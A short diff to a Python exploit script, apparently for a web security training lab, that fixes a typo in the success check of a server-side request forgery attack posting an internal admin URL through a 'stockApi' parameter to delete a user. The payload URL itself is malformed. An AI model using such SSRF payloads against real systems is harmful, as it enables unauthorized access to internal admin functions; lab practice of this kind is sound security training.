@@ -30,7 +30,7 @@ def delete_user(url, admin_ip_address):
     check_admin_url_ssrf_payload = 'http://192/168.0.%s:8080/admin' % admin_ip_address
     param2 = {'stockApi' : check_admin_url_ssrf_payload}
     r = requests.post(url + check_stock_path, data=param2, verify=False, proxies=proxies)
-    if 'User deleted successfuly' in r.text:
+    if 'User deleted successfully' in r.text:
         print("(+) Successfuly delelted Carlos user")
     else:
         print("(-) Exploit was uncuccesseful")
